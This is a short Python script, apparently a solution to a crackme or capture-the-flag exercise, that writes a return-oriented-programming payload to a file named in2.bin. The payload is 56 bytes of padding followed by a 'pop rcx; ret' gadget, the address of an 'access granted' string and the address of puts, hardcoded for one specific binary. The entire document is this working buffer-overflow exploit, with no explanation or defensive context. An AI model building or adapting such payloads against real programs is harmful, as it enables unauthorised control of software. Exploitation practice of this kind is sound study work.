import struct

PUTS_ADDRESS = 0x1400020B8
ACCESS_GRANTED_ADDRESS = 0x140004000
POP_RCX_RET = 0x140001FC0

# ROP-цепочка
payload = b'A' * 56
payload += struct.pack('<Q', POP_RCX_RET)
payload += struct.pack('<Q', ACCESS_GRANTED_ADDRESS)
payload += struct.pack('<Q', PUTS_ADDRESS)

with open('in2.bin', 'wb') as f:
    f.write(payload)